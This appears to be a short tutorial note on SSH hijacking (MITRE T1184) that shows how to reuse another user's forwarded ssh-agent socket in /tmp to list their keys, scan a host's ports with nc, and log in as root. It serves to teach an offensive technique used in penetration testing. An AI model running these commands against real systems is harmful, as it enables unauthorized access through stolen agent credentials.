[SSH Hijacking](https://attack.mitre.org/techniques/T1184/) is a technique to leverage an existing SSH session to SSH into another machine. In order to access an SSH server (which uses public-key authentication) through another server, the private key is not kept on the server. Instead, ssh-agent forwarding is performed on the client machine. The SSH agent socket will be available on the server and can be used to authenticate with the other SSH server via the ssh-agent running on the client machine.


By default socket used to communicate with the ssh agent is stored in `/tmp` directory. Check the files in that directory

So we will set the ssh authentication and then list the aviaable keys to the agent
```bash
SSH_AUTH_SOCK=/tmp/ssh-hucvbyWE/agent.18 ssh-add -l
```
Then we need to find the Network Ip and then open port of ssh connection
```bash
nc -v -n -w2 -z [IP] 1-65535
```

Connect via SSH_AUTH_SOCK
```bash
SSH_AUTH_SOCK=/tmp/ssh-1ce3W/agent.18 ssh root@IP
```
